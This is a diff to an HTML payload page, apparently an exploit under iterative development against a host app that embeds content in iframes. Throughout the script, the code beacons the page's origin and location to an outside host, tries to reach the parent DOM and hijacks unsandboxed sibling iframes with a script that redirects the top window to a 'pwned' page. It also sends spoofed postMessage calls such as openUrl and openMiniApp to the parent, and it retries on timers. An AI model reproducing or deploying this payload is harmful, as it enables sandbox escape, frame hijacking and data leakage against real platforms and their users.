@@ -2,46 +2,85 @@
 <html>
 	<body>
 		<script>
-			// Beacon - this will show in your server logs
+			function signalReady() {
+				window.parent.postMessage({ jsonrpc: "2.0", method: "ready" }, "*");
+				window.parent.postMessage({ type: "APPLY", path: ["ready"], argumentList: [] }, "*");
+				window.parent.postMessage({ type: "ready" }, "*");
+				window.parent.postMessage({ method: "ready" }, "*");
+			}
+
+			// Signal ready multiple times with delays
+			signalReady();
+			setTimeout(signalReady, 100);
+			setTimeout(signalReady, 300);
+			setTimeout(signalReady, 500);
+			setTimeout(signalReady, 1000);
+
+			// Beacon
 			fetch("https://screenshotsart.store/log?event=payload_executed&origin=" + encodeURIComponent(window.origin) + "&location=" + encodeURIComponent(window.location.href));
 
-			console.log("=== PAYLOAD v2 ===");
+			console.log("=== PAYLOAD v4 - RETRY READY ===");
 			console.log("Origin:", window.origin);
 			console.log("Location:", window.location.href);
 
-			// Try to access parent
-			try {
-				const parentDoc = window.parent.document;
-				console.log("🎯 PARENT DOM ACCESS WORKED!");
-				fetch("https://screenshotsart.store/log?event=parent_access_success");
+			function attemptExploit(attemptNum) {
+				console.log("Exploit attempt", attemptNum);
+				fetch("https://screenshotsart.store/log?event=exploit_attempt&num=" + attemptNum);
 
-				const iframes = parentDoc.querySelectorAll("iframe");
-				console.log("Siblings:", iframes.length);
-				fetch("https://screenshotsart.store/log?event=found_iframes&count=" + iframes.length);
+				// Try to access parent
+				try {
+					const parentDoc = window.parent.document;
+					console.log("🎯 PARENT DOM ACCESS WORKED!");
+					fetch("https://screenshotsart.store/log?event=parent_access_success&attempt=" + attemptNum);
 
-				iframes.forEach((f, i) => {
-					const sandbox = f.getAttribute("sandbox");
-					console.log(`  [${i}] sandbox: ${sandbox || "NONE"}, src: ${f.src.substring(0, 50)}`);
+					const iframes = parentDoc.querySelectorAll("iframe");
+					console.log("Siblings:", iframes.length);
+					fetch("https://screenshotsart.store/log?event=found_iframes&count=" + iframes.length);
 
-					if (!sandbox) {
-						console.log("  🔥 UNSANDBOXED! Hijacking...");
-						fetch("https://screenshotsart.store/log?event=hijacking_frame&index=" + i);
-						f.srcdoc = '<script>fetch("https://screenshotsart.store/log?event=victory");window.top.location="https://screenshotsart.store/pwned"<\/script>';
-					}
-				});
-			} catch (e) {
-				console.log("Parent access blocked:", e.message);
-				fetch("https://screenshotsart.store/log?event=parent_blocked&error=" + encodeURIComponent(e.message));
+					iframes.forEach((f, i) => {
+						const sandbox = f.getAttribute("sandbox");
+						console.log(`  [${i}] sandbox: ${sandbox || "NONE"}, src: ${f.src.substring(0, 50)}`);
+
+						if (!sandbox) {
+							console.log("  🔥 UNSANDBOXED! Hijacking...");
+							fetch("https://screenshotsart.store/log?event=hijacking_frame&index=" + i);
+							f.srcdoc = '<script>fetch("https://screenshotsart.store/log?event=victory");window.top.location="https://screenshotsart.store/pwned"<\/script>';
+						}
+					});
+					return true; // Success
+				} catch (e) {
+					console.log("Parent access blocked:", e.message);
+					fetch("https://screenshotsart.store/log?event=parent_blocked&attempt=" + attemptNum + "&error=" + encodeURIComponent(e.message));
+
+					// Try postMessage attacks
+					window.parent.postMessage(
+						{
+							type: "APPLY",
+							path: ["openUrl"],
+							argumentList: ["https://screenshotsart.store/pwned"],
+						},
+						"*",
+					);
+
+					window.parent.postMessage(
+						{
+							type: "APPLY",
+							path: ["openMiniApp"],
+							argumentList: [{ url: "https://screenshotsart.store/pwned" }],
+						},
+						"*",
+					);
+
+					return false; // Failed
+				}
 			}
 
-			// Also try grandparent
-			try {
-				const gpDoc = window.parent.parent.document;
-				console.log("🎯 GRANDPARENT ACCESS WORKED!");
-				fetch("https://screenshotsart.store/log?event=grandparent_success");
-			} catch (e) {
-				console.log("Grandparent blocked:", e.message);
-			}
+			// Try exploit multiple times with increasing delays
+			setTimeout(() => attemptExploit(1), 200);
+			setTimeout(() => attemptExploit(2), 600);
+			setTimeout(() => attemptExploit(3), 1200);
+			setTimeout(() => attemptExploit(4), 2000);
+			setTimeout(() => attemptExploit(5), 3000);
 		</script>
 	</body>
 </html>
